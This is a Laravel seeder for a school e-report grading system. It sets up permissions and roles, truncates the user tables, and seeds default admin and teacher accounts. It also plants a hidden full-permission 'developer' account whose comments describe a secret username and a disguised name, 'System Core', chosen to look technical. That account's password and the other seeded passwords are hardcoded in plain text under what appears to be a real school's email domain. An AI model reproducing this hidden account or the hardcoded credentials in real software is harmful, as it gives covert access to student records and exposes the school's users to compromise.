<?php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use App\Models\User;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\Hash;

class RolePermissionSeeder extends Seeder
{
    public function run(): void
    {
        // 1. Reset Cache Permission (WAJIB)
        app()[\Spatie\Permission\PermissionRegistrar::class]->forgetCachedPermissions();

        // 2. BERSIHKAN DATA LAMA (TRUNCATE)
        Schema::disableForeignKeyConstraints();
        DB::table('role_has_permissions')->truncate();
        DB::table('model_has_roles')->truncate();
        DB::table('model_has_permissions')->truncate();
        DB::table('roles')->truncate();
        DB::table('permissions')->truncate();
        DB::table('users')->truncate();
        Schema::enableForeignKeyConstraints();

        // ====================================================
        // 3. DEFINISI PERMISSION (HCMS STYLE - MODULAR)
        // ====================================================
        $permissions = [
            // A. DASHBOARD
            '01. Dashboard (Semua)' => [
                'dashboard.view' => 'Melihat Halaman Dashboard',
            ],

            // B. MASTER DATA (Admin Only)
            '02. Master Data (Admin Only)' => [
                'master.view' => 'Melihat Data Sekolah',      // Lihat menu
                'master.edit' => 'Mengelola Data Sekolah',    // Simpan/edit data sekolah
            ],

            // C. MUTASI DATA (Admin Only)
            '03. Mutasi Data (Admin Only)' => [
                'mutasi.view' => 'Melihat Data Mutasi',      // Lihat menu
                'mutasi.edit' => 'Mengelola Data Mutasi',    // Simpan/edit data mutasi
            ],
            
            // D. PENILAIAN (Guru & Admin)
            '04. Penilaian (Guru & Admin)' => [
                'nilai.view' => 'Melihat Data Nilai',       // Akses menu input nilai
                'nilai.input' => 'Mengelola Data Nilai',      // Hak simpan/edit nilai
            ],

            // E. EKSTRAKURIKULER (Pembina & Admin)
            '05. Ekstrakurikuler (Pembina & Admin)' => [
                'ekskul.view' => 'Melihat Nilai Ekstrakurikuler',      // Akses menu input nilai ekskul
                'ekskul.edit' => 'Mengelola Nilai Ekstrakurikuler',     // Hak simpan/edit nilai ekskul
            ],

            // E. EKSTRAKURIKULER (Walikelas & Admin)
            '06. Walikelas Menu (Walikelas & Admin)' => [
                'walikelas.view' => 'Melihat Nilai Walikelas',      // Akses menu input nilai ekskul
                'walikelas.edit' => 'Mengelola Nilai Walikelas',     // Hak simpan/edit nilai ekskul
            ],

            // F. LAPORAN & RAPOR (Guru & Admin)
            '07. Laporan & Rapor (Guru & Admin)' => [
                'rapor.view' => 'Melihat Rapor Siswa',       // Akses menu cetak rapor
                'rapor.cetak' => 'Mencetak Rapor Siswa',      // Hak print/download
                'ledger.view' => 'Melihat Ledger Nilai',      // Akses menu ledger
                'ledger.cetak' => 'Mencetak Legder Nilai',     // Hak download ledger
            ],

            // G. SYSTEM SETTINGS (Admin Only)
            '08. System Settings (Admin Only)' => [
                'users.read' => 'Melihat Menu Manajemen User', 
                'users.edit' => 'Mengelola Data User',
                'roles.menu' => 'Mengakses Menu Role & Permission',
                'settings.erapor.read' => 'Melihat Pengaturan E-Rapor', 
                'settings.erapor.update' => 'Mengelola Pengaturan E-Rapor',
            ],
        ];

        foreach ($permissions as $group => $perms) {
            foreach ($perms as $permName => $permLabel) {
                Permission::updateOrCreate(
                    ['name' => $permName], // Cek berdasarkan name
                    [
                        'group_name' => $group, // Simpan Group
                        'label'      => $permLabel // Simpan Label
                    ]
                );
            }
        }

        // ====================================================
        // 4. BUAT ROLE SPESIAL
        // ====================================================
        
        $roleDev = Role::create(['name' => 'developer']);
        $roleDev->givePermissionTo(Permission::all());
        
        // --- ROLE 1: ADMIN ERAPOR (FULL AKSES) ---
        $roleAdmin = Role::create(['name' => 'admin_erapor']);
        $roleAdmin->givePermissionTo(Permission::all()); // Sakti mandraguna

        // --- ROLE 2: GURU ERAPOR (BACKUP / SUPER GURU) ---
        $roleGuruErapor = Role::create(['name' => 'guru_erapor']);
        $roleGuruErapor->givePermissionTo([
            'dashboard.view',
            // Full Akses Penilaian
            'nilai.view', 'nilai.input',
            // Full Akses Rapor & Ledger
            // 'rapor.view', 'rapor.cetak',
            // 'ledger.view', 'ledger.cetak',
            'ekskul.view', 'ekskul.edit',
        ]);

        // --- Role 2a: GURU EKSTRAKURIKULER (Opsional) ---
        $roleGuruEkskul = Role::create(['name' => 'guru_ekskul']);
        $roleGuruEkskul->givePermissionTo([
            'dashboard.view',
            'ekskul.view', 'ekskul.edit',
        ]);

        // --- ROLE 3: GURU REGULER (Standar) ---
        $roleGuru = Role::create(['name' => 'guru']);
        $roleGuru->givePermissionTo([
            'dashboard.view',
            'nilai.view', 'nilai.input',
            // 'rapor.view', 'ledger.view', // Mungkin guru biasa view saja, cetak urusan admin? (Opsional)
            'ekskul.view', 'ekskul.edit',
        ]);

        // --- ROLE 4: SISWA ---
        $roleSiswa = Role::create(['name' => 'siswa']);
        $roleSiswa->givePermissionTo([
            'dashboard.view',
            'rapor.view' // Siswa hanya bisa lihat/download rapor sendiri
        ]);


        // ====================================================
        // 5. BUAT USER SPESIAL OTOMATIS
        // ====================================================
        
        // USER 0: DEVELOPER (AKUN DARURAT)
        $dev = User::firstOrCreate(
            ['username' => 'dev.campus'], // Username rahasia
            [
                'name'      => 'System Core', // Nama samaran agar terlihat teknis
                'email'     => 'campus@dev.id',
                'password'  => Hash::make('campussolusi26#'), // Password Kuat
                'role'      => 'developer',
            ]
        );
        $dev->assignRole($roleDev);
        
        $this->command->info('Akun Developer Hidden berhasil dibuat!');
        
        // USER 1: ADMIN ERAPOR
        $adminUser = User::firstOrCreate(
            ['username' => 'admin.erapor'], // Cek berdasarkan username
            [
                'name'      => 'Administrator E-Rapor',
                'username'  => 'admin.erapor',
                'email'     => 'admin@smkn1salatiga.sch.id',
                'password'  => Hash::make('adminerapor#'), // Password Default
                'role'      => 'admin_erapor', // Kolom manual (backup)
            ]
        );
        $adminUser->assignRole($roleAdmin);

        // USER 2: GURU ERAPOR (BACKUP)
        $guruUser = User::firstOrCreate(
            ['username' => 'guru.erapor'], 
            [
                'name'      => 'Guru E-Rapor (Backup)',
                'username'  => 'guru.erapor',
                'email'     => 'guru@smkn1salatiga.sch.id',
                'password'  => Hash::make('gurusmkn1'),
                'role'      => 'guru_erapor',
            ]
        );
        $guruUser->assignRole($roleGuruErapor);

         // USER 2b: GURU EKSKUL (BACKUP)
        $guruEkskulUser = User::firstOrCreate(
            ['username' => 'guru.ekskul'], 
            [
                'name'      => 'Guru Ekskul E-Rapor (Backup)',
                'username'  => 'guru.ekskul',
                'email'     => 'ekskul@smkn1salatiga.sch.id',
                'password'  => Hash::make('ekskulsmkn1'),
                'role'      => 'guru_ekskul',
            ]
        );
        $guruEkskulUser->assignRole($roleGuruEkskul);

        $this->command->info('SUKSES! User Spesial telah dibuat:');
        $this->command->info('1. Admin: admin.erapor / password');
        $this->command->info('2. Guru: guru.erapor / password');
        $this->command->info('3. Guru: guru.ekskul / password');
    }
}